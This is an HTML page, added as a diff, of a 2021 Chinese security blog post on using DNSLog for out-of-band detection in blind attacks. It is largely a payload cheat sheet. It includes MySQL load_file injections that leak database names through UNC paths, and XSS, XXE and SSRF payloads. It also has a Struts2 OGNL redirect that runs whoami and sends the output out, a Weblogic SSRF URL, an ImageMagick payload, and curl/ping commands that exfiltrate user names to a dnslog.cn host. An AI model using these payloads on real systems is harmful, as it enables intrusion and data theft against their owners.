@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> DNSLog 使用 | Maka8ka&#39;s Garden</title>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="DNSLog 使用" />
+<meta property="og:description" content="DNSLog 关键词: SQL, 漏洞
+应用前提  SQL盲注 无回显命令执行 XXE盲打 SSRF盲打  DNSLog服务器搭建 https://github.com/lanyi1998/DNSlog-GO
+https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg
+DNSLog在盲注中用法 Mysql数据库 利用条件
+ 有file权限的数据库 开启allow_url_fopen(默认开启) secure_file_priv= 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 show global variables like &lsquo;%secure%&#39;;  payload:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.maka8ka.cc/post/dnslog-%E4%BD%BF%E7%94%A8/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-02-11T15:33:11&#43;00:00" />
+<meta property="article:modified_time" content="2021-02-11T15:33:11&#43;00:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DNSLog 使用"/>
+<meta name="twitter:description" content="DNSLog 关键词: SQL, 漏洞
+应用前提  SQL盲注 无回显命令执行 XXE盲打 SSRF盲打  DNSLog服务器搭建 https://github.com/lanyi1998/DNSlog-GO
+https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg
+DNSLog在盲注中用法 Mysql数据库 利用条件
+ 有file权限的数据库 开启allow_url_fopen(默认开启) secure_file_priv= 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 show global variables like &lsquo;%secure%&#39;;  payload:"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://www.maka8ka.cc/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://www.maka8ka.cc/images/favicon.ico" />
+
+  
+  
+  
+  
+  
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RFYM27MKD6"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-RFYM27MKD6', { 'anonymize_ip': false });
+}
+</script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+    <header id="header">
+  <a href="https://www.maka8ka.cc/">
+  
+    <div id="logo" style="background-image: url(https://www.maka8ka.cc/images/logo.png)"></div>
+  
+  <div id="title">
+    <h1>Maka8ka&#39;s Garden</h1>
+  </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x" aria-hidden="true"></i></a>
+      </li>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/post/">Posts</a></li>
+      
+        <li><a href="/categories/">Categories</a></li>
+      
+        <li><a href="https://github.com/Maka8ka">Github</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+
+
+    
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <div class="content" itemprop="articleBody">
+  
+    <h1 id="dnslog">DNSLog</h1>
+<p>关键词: SQL, 漏洞</p>
+<h2 id="应用前提">应用前提</h2>
+<ul>
+<li>SQL盲注</li>
+<li>无回显命令执行</li>
+<li>XXE盲打</li>
+<li>SSRF盲打</li>
+</ul>
+<h2 id="dnslog服务器搭建">DNSLog服务器搭建</h2>
+<p><a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></p>
+<p><a href="https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg">https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg</a></p>
+<h2 id="dnslog在盲注中用法">DNSLog在盲注中用法</h2>
+<h3 id="mysql数据库">Mysql数据库</h3>
+<p>利用条件</p>
+<ol>
+<li>有file权限的数据库</li>
+<li>开启allow_url_fopen(默认开启)</li>
+<li>secure_file_priv=</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
+<li>show global variables like &lsquo;%secure%';</li>
+</ol>
+<p>payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> load_file(<span style="color:#e6db74">&#39;\\\\requests.xxxx.dnslog.cn\\aa&#39;</span>);
+<span style="color:#66d9ef">select</span> load_file(concat(<span style="color:#e6db74">&#39;\\\\&#39;</span>,(<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">database</span>()),<span style="color:#e6db74">&#39;.xxxx.dnslog.cn/aa&#39;</span>));
+http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>fuzz<span style="color:#f92672">/</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">if</span>((<span style="color:#66d9ef">select</span> load_file(concat(<span style="color:#ae81ff">0</span>x7c,(<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">database</span>()),<span style="color:#e6db74">&#39;xxx.dnslog.cn&#39;</span>))),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>在mysql中 IF() 函数的用法类似于java中的三目表达式，其用处也比较多</p>
+<p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值</p>
+<ul>
+<li><strong>UNC路径</strong></li>
+</ul>
+<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
+<p>其实我们平常在Windows中用共享文件的时候就会用到这种网络地址的形式</p>
+<p><code>\\sss.xxx\test\</code></p>
+<p>这也就解释了为什么CONCAT()函数拼接了4个<code>\</code>了，因为转义的原因，4个<code>\</code>就变成了2个<code>\</code>，目的就是利用UNC路径。</p>
+<p>因为Linux没有UNC路径这个东西，所以当MySQL处理Linux系统中的时候，是不能用这种方式外带数据的。</p>
+<h3 id="sqlserveer">SQLServeer</h3>
+<h3 id="oracle">Oracle</h3>
+<h3 id="postgresql">PostgreSQL</h3>
+<h2 id="xss">XSS</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://XSS.XXXXX.dnslog.cn</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><h2 id="ssrf">SSRF</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!ENTITY test SYSTEM &#34;SSRF.xxxx.dnslog.cn\\aa&#34;&gt;</span>
+</code></pre></div><h2 id="xxexml-entity-injection">XXE（XML Entity Injection）</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE root [
+</span><span style="color:#75715e">&lt;!ENTITY % remote SYSTEM &#34;http://ip.port.xxx.dnslog.cn/xxe_test&#34;&gt;</span>
+%remote;]&gt;
+<span style="color:#f92672">&lt;root/&gt;</span>
+</code></pre></div><h2 id="struts2">Struts2</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">xx.action?redirect:http://ip.port.xxx.dnslog.cn/%25{3*4}
+xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{&#39;whoami&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&#34;http://ip.port.xxx.dnslog.cn/result%3d&#34;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&#34;GET&#34;),%23http.connect(),%23http.getInputStream()}
+</code></pre></div><h3 id="weblogic">Weblogic</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">http://example.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.xxx.dnslog.cn/test<span style="color:#960050;background-color:#1e0010">&amp;</span>rdoSearch=name<span style="color:#960050;background-color:#1e0010">&amp;</span>txtSearchname=sdf<span style="color:#960050;background-color:#1e0010">&amp;</span>txtSearchkey=<span style="color:#960050;background-color:#1e0010">&amp;</span>txtSearchfor=<span style="color:#960050;background-color:#1e0010">&amp;</span>selfor=Businesslocation<span style="color:#960050;background-color:#1e0010">&amp;</span>btnSubmit=Search
+</code></pre></div><h3 id="imagemagic">ImageMagic</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">push graphic-context
+viewbox 0 0 640 480
+fill &#39;url(http://ip.port.xxx.dnslog.cn)&#39;
+pop graphic-context
+</code></pre></div><h2 id="dnslog中命令执行">DNSLog中命令执行</h2>
+<h3 id="linux">Linux</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">curl http<span style="color:#f92672">:</span><span style="color:#75715e">//ip.port.xxx.dnslog.cn/`whoami`
+</span><span style="color:#75715e"></span>ping <span style="color:#960050;background-color:#1e0010">`</span>whoami<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ip</span><span style="color:#f92672">.</span><span style="color:#a6e22e">port</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xxx</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dnslog</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
+</code></pre></div><h3 id="windows">Windows</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">ping <span style="color:#f92672">%</span>USERNAME<span style="color:#f92672">%.</span><span style="color:#a6e22e">xxx</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dnslog</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>
+</code></pre></div><pre><code>变量                     类型       描述
+%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
+%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
+%CD%                     本地       返回当前目录字符串。
+%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
+%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
+%COMPUTERNAME%           系统       返回计算机的名称。
+%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
+%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
+%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
+%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
+%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
+%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
+%PATH%                   系统       指定可执行文件的搜索路径。
+%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
+%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
+%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
+%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
+%PROCESSOR_REVISION%     系统       返回处理器的版本号。
+%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
+%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
+%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
+%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
+%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
+%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。
+%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
+%USERNAME%               本地       返回当前登录的用户的名称。
+%USERPROFILE%            本地       返回当前用户的配置文件的位置。
+%WINDIR%                 系统       返回操作系统目录的位置。
+</code></pre>
+  
+  </div>
+</article>
+
+
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Maka8ka 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/post/">Posts</a></li>
+         
+        <li><a href="/categories/">Categories</a></li>
+         
+        <li><a href="https://github.com/Maka8ka">Github</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+</html>
